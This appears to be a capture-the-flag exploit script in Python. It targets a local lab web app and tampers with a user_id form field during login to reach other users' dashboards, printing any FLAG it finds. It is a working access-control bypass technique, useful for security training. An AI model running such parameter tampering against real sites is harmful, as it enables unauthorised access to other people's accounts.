import requests
import re

base_url = "http://127.0.0.1:32883"

# Test range around known value 10032
test_range = range(10020, 10041)

print(f"[*] Testing user_id range: {test_range.start} to {test_range.stop-1}")
print(f"[*] Total tests: {len(test_range)}\n")

success_count = 0
flag_found = False

for user_id in test_range:
    # Create new session for each attempt
    session = requests.Session()
    
    try:
        # Step A: POST username to initiate login
        step_a_data = {'username': 'test'}
        resp_a = session.post(f"{base_url}/", data=step_a_data, allow_redirects=True)
        
        # Step B is handled by allow_redirects=True above
        # Should now be at /password/test
        
        # Step C: POST credentials with fuzzed user_id
        step_c_data = {
            'username': 'test',
            'password': 'test',
            'user_id': str(user_id)
        }
        resp_c = session.post(f"{base_url}/password/test", data=step_c_data, allow_redirects=True)
        
        # Step D: GET dashboard
        resp_d = session.get(f"{base_url}/dashboard", allow_redirects=False)
        
        # Analyze dashboard response
        status = resp_d.status_code
        content_len = len(resp_d.content)
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_d.text)
        
        # Print interesting results
        if flag_match:
            print(f"\n{'='*80}")
            print(f"[!!! FLAG FOUND !!!] user_id={user_id}")
            print(f"[!] Status: {status} | Length: {content_len}B")
            print(f"[!] FLAG: {flag_match.group(0)}")
            print(f"[!] Full Response:")
            print(resp_d.text)
            print(f"{'='*80}\n")
            flag_found = True
            success_count += 1
        elif status == 200:
            # Successful dashboard access
            print(f"\n[SUCCESS] user_id={user_id}")
            print(f"  Status: {status} | Length: {content_len}B")
            print(f"  Response preview: {resp_d.text[:200]}")
            
            # Print full response for analysis
            if "error" not in resp_d.text.lower() and "500" not in resp_d.text:
                print(f"  Full Response:")
                print(resp_d.text)
            success_count += 1
        elif status not in [302, 500]:
            # Anomaly - not redirect, not 500 error
            print(f"\n[ANOMALY] user_id={user_id}")
            print(f"  Status: {status} | Length: {content_len}B")
            print(f"  Response: {resp_d.text}")
        
    except Exception as e:
        print(f"[ERROR] user_id={user_id}: {str(e)}")

print(f"\n{'='*80}")
print(f"[SUMMARY]")
print(f"  Range tested: {test_range.start} to {test_range.stop-1}")
print(f"  Total tests: {len(test_range)}")
print(f"  Successful accesses: {success_count}")
print(f"  Flag found: {flag_found}")
print(f"{'='*80}")

